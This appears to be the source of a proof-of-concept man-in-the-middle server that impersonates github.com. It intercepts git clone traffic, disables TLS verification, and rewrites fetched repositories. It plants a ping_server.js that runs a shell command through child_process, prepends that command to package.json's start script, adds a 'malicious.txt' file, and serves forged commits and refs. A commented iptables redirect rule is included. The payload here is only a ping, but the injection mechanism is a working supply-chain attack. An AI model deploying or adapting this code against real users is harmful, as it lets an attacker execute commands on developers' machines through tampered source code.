# from flask import Flask, request, Response
from fastapi import FastAPI, Path, Request, Response, Depends
from util.db import (
    get_ref,
    insert_object,
    set_ref,
    get_object,
    set_completed,
    get_ref_object,
)
import json
import pickle

proxies = {
    # "http": "http://host.docker.internal:8080",
    # "https": "http://host.docker.internal:8080"
}

# import subprocess
# from contextlib import asynccontextmanager
app = FastAPI()

from fastapi_asyncpg import configure_asyncpg
from util import packfile

import requests as r
import logging
from logging import debug, info, warn, error

logging.basicConfig(level=logging.DEBUG, format="%(levelname)s:\t%(message)s")


from util import objects, refs, remote
import re


db = configure_asyncpg(app, "postgresql://postgres:postgres@eve-db/db")


@db.on_init
async def initialize_db(db):
    await db.execute(
        """
        CREATE TABLE IF NOT EXISTS objects (
            hash char(40) primary key,
            blob bytea not null
        );
        CREATE TABLE IF NOT EXISTS refs (
            remote text not null,
            old text not null,
            new text not null,
            PRIMARY KEY (remote, old)
        );
        CREATE TABLE IF NOT EXISTS cache (
            remote text primary key,
            ref_blob bytea
        )
    """
    )


# add ip forwarding rule
# doesn't work - moved out of function into separate .sh file anyway
# @asynccontextmanager
# async def lifespan(app: FastAPI):
#     subprocess.Popen("iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080", shell=True).wait()
#     yield

BACKEND_URL = "https://github.com"
BLOCKED_HEADERS = [
    "content-length",
    "connection",
    "content-encoding",
    "transfer-encoding",
    "host",
]


# Just for testing - not strictly needed
@app.get("/")
def homepage():
    return Response("MITM success!\n")


@app.get("/{base:path}/info/refs")
async def info_refs(base: str, request: Request, db=Depends(db.connection)):
    headers = request.headers

    repo_base_url = f"{BACKEND_URL}/{base}"
    ref_list = await get_ref_object(repo_base_url, db)

    # Handle retrieving stuff via smart github.com protocol

    # Retrieve refs

    if ref_list is None:

        filtered_headers = dict(
            [
                (k.lower(), v)
                for (k, v) in headers.items()
                if k.lower() not in BLOCKED_HEADERS
            ]
        )
        payload = "0014command=ls-refs\n0014agent=git/2.46.00016object-format=sha100010009peel\n000csymrefs\n000bunborn\n0014ref-prefix HEAD\n001bref-prefix refs/heads/\n001aref-prefix refs/tags/\n0000"

        github_headers = filtered_headers.copy()
        github_headers["git-protocol"] = "version=2"
        github_headers["host"] = "github.com"

        info("Downloading files...")
        response = r.request(
            "POST",
            f"{repo_base_url}/git-upload-pack",
            headers=github_headers,
            data=payload,
            proxies=proxies,
            verify=False,
        )

        if response.status_code == 401:
            # Forward request to force git to authenticate
            return Response(response.content, response.status_code, response.headers)

        debug("Response: %s, headers: %s", response, github_headers)

        lines = remote.SmartPacket.parse_packet(response.content).lines

        debug(lines)

        debug("Received refs via smart protocol")

        ref_list = refs.Refs.from_smart_bytes(lines)

        head_id = ref_list.refs[b"HEAD"]
        head_ref = ref_list.HEAD

        debug("Sending upload-pack request")

        debug(github_headers)
        response = r.request(
            "POST",
            f"{repo_base_url}/git-upload-pack",
            headers=github_headers,
            data=ref_list.export_smart_request(),
            stream=True,
        )

        file_contents = bytearray()

        sum = 0
        for chunk in response.iter_content(chunk_size=102400):
            if chunk:
                debug("Added chunk %d", len(chunk))
                sum += len(chunk)
                file_contents.extend(chunk)

        debug("Done downloading file")
        packet = remote.SmartPacket.parse_packet(bytes(file_contents))
        # debug("Parsed packet: %s", packet)

        pf = packet.extract_lines(line_type=1)
        info("Extracting packfile")
        pf_parsed = await packfile.read_packfile(pf, database=db, parse=False)

        await set_completed(repo_base_url, pickle.dumps(ref_list), db)
    else:
        info("Skipping remote requestes b/c already downloaded")

        ref_list = pickle.loads(ref_list)
        head_id = ref_list.refs[b"HEAD"]
        head_ref = ref_list.HEAD

    # return Response(bytes(pf), media_type="binary/octet-stream")

    # return "stop"

    # .path automatically ignores query parameters, disabling smart git mode
    # ref_list = r.get(f"{BACKEND_URL}{request.url.path}", headers=filtered_headers)
    # if ref_list.status_code != 200:
    #     return Response(ref_list.content, ref_list.status_code, headers=ref_list.headers)
    # ref_list = refs.Refs.from_dumb_bytes(ref_list.content)

    # determine which ref is HEAD
    # head_ref = r.get(f"{repo_base_url}/HEAD").content
    # head_id = None
    # debug(f"Got HEAD ref as {head_ref}")
    # if head_ref.startswith(b"ref: "):
    #     head_ref = head_ref[5:].strip()
    #     debug(f"Head REF: {head_ref}")
    #     head_id = ref_list.refs.get(head_ref)
    # else:
    #     head_id = head_ref
    #     head_ref = None

    debug(f"Found HEAD ref {head_id}")
    assert re.match(r"^[a-fA-F0-9]{40}$", head_id.decode())

    # Fetch head commit
    head_commit: objects.CommitObject = await get_object(head_id.decode(), db)
    debug(f"Head commit: {head_commit}")

    # Fetch top level tree
    top_tree: objects.TreeObject = await get_object(head_commit.tree.decode(), db)
    debug(f"Tree: {top_tree}")

    # Get the package.json file and edit it
    if top_tree.get_file(b"package.json") in top_tree.entries:
        # Create new .js file that will run ping
        debug("package.json file found, modifying contents...")

        calc_open = objects.BlobObject(
            b"""const p = require('child_process')\np.exec("ping 1.1.1.1")\n""", None
        )
        await insert_object(calc_open, db)
        debug(f"Fake file: {calc_open}")

        # Insert fake file into tree
        top_tree.add_file(b"ping_server.js", calc_open.calc_hash_new())

        # Edit package.json
        package_json: objects.BlobObject = await get_object(
            top_tree.get_file(b"package.json")["file_hash"], db
        )
        parsed = json.loads(package_json.contents)
        debug("Parsed package.json:")
        debug(parsed)
        try:
            parsed["scripts"]["start"] = "ping 1.1.1.1 & " + parsed["scripts"]["start"]
        except:
            parsed["scripts"]["start"] = "ping 1.1.1.1&"
        parsed["main"] = "ping_server.js"
        package_json = json.dumps(parsed, indent=4)
        package_json = objects.BlobObject(package_json.encode(), None)
        await insert_object(package_json, db)

        # Update package.json with new packgae.json
        top_tree.add_file(b"package.json", package_json.calc_hash_new())

    # Create new fake file
    malicious_file: objects.BlobObject = objects.BlobObject(
        b"This is not a real file in the repo\n", None
    )
    await insert_object(malicious_file, db)
    debug(f"Fake file: {malicious_file}")

    # Insert fake file into tree
    top_tree.add_file(b"malicious.txt", malicious_file.calc_hash_new())
    await insert_object(top_tree, db)

    # Insert fake tree into commit
    head_commit.tree = top_tree.calc_hash_new().encode()
    debug(f"Fake commit: {head_commit}")
    await insert_object(head_commit, db)

    await set_ref(repo_base_url, "HEAD", head_ref.decode(), db)

    ref_list.refs[head_ref] = head_commit.calc_hash_new().encode()

    return Response(ref_list.export_dumb())


# TODO: proper HEAD ref return
@app.get("/{base:path}/HEAD")
async def head_path(base: str, request: Request, db=Depends(db.atomic)):
    debug("HEAD request")

    repo_base_url = f"{BACKEND_URL}/{base}"

    return Response("ref: " + await get_ref(repo_base_url, "HEAD", db))

    # headers = request.headers

    # ref_list = r.get(f"{BACKEND_URL}{request.url.path}", headers=headers).content

    # raise NotImplementedError()


@app.get("/{subpath:path}")
async def get_handler(subpath: str, request: Request, db=Depends(db.connection)):

    headers = request.headers

    filtered_headers = dict(
        [
            (k.lower(), v.lower())
            for (k, v) in headers.items()
            if k.lower() not in BLOCKED_HEADERS
        ]
    )

    path = request.url.path
    match = re.search(r"/objects/([0-9a-f]{2})/([0-9a-f]{38})", path)

    if match is not None:
        hash = f"{match.group(1)}{match.group(2)}"
        res = await db.fetchrow("SELECT * FROM objects WHERE hash = $1;", hash)
        if res is not None:
            debug(f"Using cached object {res[0]}")
            return Response(res[1])

    if "objects/info" in path:
        return Response("", 204)

    res = r.get(f"{BACKEND_URL}{path}", headers=filtered_headers)

    if res.status_code != 200:
        Response("Not found", 404)

    res_headers = dict(
        [
            (k.lower(), v.lower())
            for (k, v) in res.headers.items()
            if k.lower() not in BLOCKED_HEADERS
        ]
    )

    new_obj = res.content
    if match is not None:
        hash = f"{match.group(1)}{match.group(2)}"
        await db.execute(
            "INSERT INTO objects VALUES ($1, $2) ON CONFLICT DO NOTHING;",
            hash,
            res.content,
        )
        obj = objects.parse_object(res.content, hash)
        try:
            new_obj = obj.export_object_orig()
        except:
            pass
        debug(obj)

    return Response(new_obj, res.status_code, res_headers)


# @app.route('/<path:subpath>', methods=["POST"])
# def post_handler(subpath):
#     # show the subpath after /path/
#     headers = request.headers
#     body = request.get_data()
#     path = request.full_path

#     res = r.post(f"{BACKEND_URL}{path}", headers=headers, data=body)

#     headers = [(k, v) for (k, v) in res.headers.items() if k.lower() not in BLOCKED_HEADERS]

#     print(path, flush=True)

#     return Response(res.content, res.status_code, headers)


#     # return Response(f"{headers}\n{method}\n{body}\n{path}", mimetype="text/plain")
